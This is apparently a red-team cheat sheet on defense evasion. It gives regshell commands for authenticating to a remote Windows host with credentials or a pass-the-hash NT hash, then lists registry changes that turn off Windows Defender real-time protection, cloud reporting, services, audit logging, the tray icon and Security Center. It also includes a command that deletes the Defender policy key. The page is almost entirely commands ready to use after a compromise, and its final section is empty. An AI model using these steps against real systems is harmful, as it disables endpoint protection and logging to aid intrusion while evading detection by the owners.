# Unix Shell

Search Tag(s): #post-exploitation #defense-evasion #staying-off-the-land #windows

## Disable Windows Defender

### Disable Real Time Protection

```
$ regshell -U "<domain>/<username>%<password>" -R <IP>

$ regshell -U "[<domain>/]<username>" --pw-nt-hash <nt_hash> -R <IP>

\> ck HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender
set AllowFastServiceStartup REG_DWORD 0
set ServiceKeepAlive REG_DWORD 0
set DisableRealtimeMonitoring REG_DWORD 1
mkkey "Real-Time Protection"
ck "Real-Time Protection"
set DisableRealtimeMonitoring REG_DWORD 1
set DisableIOAVProtection REG_DWORD 1
set DisableOnAccessProtection REG_DWORD 1
set DisableScanOnRealtimeEnable REG_DWORD 1
set DisableBehaviorMonitoring REG_DWORD 1
ck ..
mkkey Spynet
ck Spynet
set DisableBlockAtFirstSeen REG_DWORD 1
set LocalSettingOverrideSpynetReporting REG_DWORD 0
set SubmitSamplesConsent REG_DWORD 2
set SpynetReporting REG_DWORD 2
ck ..
mkkey MpEngine
ck MpEngine
set MpCloudBlockLevel REG_DWORD 2
ck HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinDefend
set Start REG_DWORD 4
```

Delete the whole registry

```
\> rmkey "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender"
```

### Disable Windows Defender Services

```
$ regshell -U "<domain>/<username>%<password>" -R <IP>

$ regshell -U "[<domain>/]<username>" --pw-nt-hash <nt_hash> -R <IP>

\> predef HKEY_LOCAL_MACHINE
ck SYSTEM\CurrentControlSet\Services\WdBoot
set Start REG_DWORD 4
ck ..\WdFilter
set Start REG_DWORD 4
ck ..\WdNisDrv
set Start REG_DWORD 4
ck ..\WdNisSvc
set Start REG_DWORD 4
ck ..\WinDefend
set Start REG_DWORD 4
ck ..\SecurityHealthService
set Start REG_DWORD 4
ck HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
set Start REG_DWORD 0
```

### Disable Logging

```
$ regshell -U "<domain>/<username>%<password>" -R <IP>

$ regshell -U "[<domain>/]<username>" --pw-nt-hash <nt_hash> -R <IP>

\> predef HKEY_LOCAL_MACHINE
ck System\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger
set Start REG_DWORD 0
ck ..\DefenderAuditLogger
set Start REG_DWORD 0
```

### Disable Systray Icon

```
$ regshell -U "<domain>/<username>%<password>" -R <IP>

$ regshell -U "[<domain>/]<username>" --pw-nt-hash <nt_hash> -R <IP>

\> ck HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run
rmval "Windows Defender"
ck HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
rmval WindowsDefender
ck HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
rmval "Windows Defender"
```

## Disable Windows Defender Security Center

```
$ regshell -U "<domain>/<username>%<password>" -R <IP>

$ regshell -U "[<domain>/]<username>" --pw-nt-hash <nt_hash> -R <IP>

\> ck HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\SecurityHealthService
set Start REG_DWORD 4
```

## Remove Windows Defender Context Menu

```

```